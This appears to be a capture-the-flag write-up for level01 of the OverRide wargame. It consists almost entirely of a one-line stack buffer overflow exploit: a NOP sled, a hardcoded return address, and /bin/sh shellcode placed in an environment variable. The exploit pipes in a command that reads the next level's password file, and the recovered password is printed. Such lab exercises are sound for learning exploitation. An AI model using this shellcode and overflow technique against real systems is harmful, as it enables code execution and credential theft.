# LEVEL1

```
(python -c 'print("dat_wil")'; python -c 'print("\x90" *80 + "\x60\xdf\xff\xff")'; echo 'cat /home/users/level02/.pass' ) | env -i shellcode=$(python -c 'print("\x90" * 100 + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")') ./level01
```

```
0xffffdf60
```

```
level01@OverRide:~$ (python -c 'print("dat_wil")'; python -c 'print("\x90" *80 + "\x60\xdf\xff\xff")'; echo 'cat /home/users/level02/.pass' ) | env -i shellcode=$(python -c 'print("\x90" * 300 + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")') ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
